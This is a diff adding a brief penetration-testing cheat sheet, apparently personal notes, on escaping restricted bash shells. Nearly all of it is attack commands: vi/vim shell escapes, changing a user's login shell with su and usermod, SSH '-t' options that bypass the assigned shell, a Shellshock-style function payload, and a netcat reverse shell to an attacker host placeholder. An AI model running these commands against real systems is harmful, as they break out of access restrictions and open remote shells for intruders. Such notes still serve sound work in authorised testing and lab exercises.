@@ -1,1 +1,21 @@
+rbash
+rbash Escape options:
+You can use shell escapes with vi and vim if they are available:
+$ vi
+:set shell=/bin/sh
+:shell
+$vim
+:set shell=/bin/sh
+:shell
+
+Rbash escape:
+echo <password> | su -c 'usermod -s /bin/bash <username>'
+
+Rbash Escape via ssh <-- The first thing I try when facing SSH into rbash is adding -t bash to the SSH connection command. This will run bash on connect instead of the assigned shell.
+ssh root@IP -t "bash --noprofile -i"
+ssh root@IP -t "() { :; }; sh -i"
+
+SSH and NC 
+ssh user@server nc <LHOST> <LPORT> -e /bin/sh
+
 
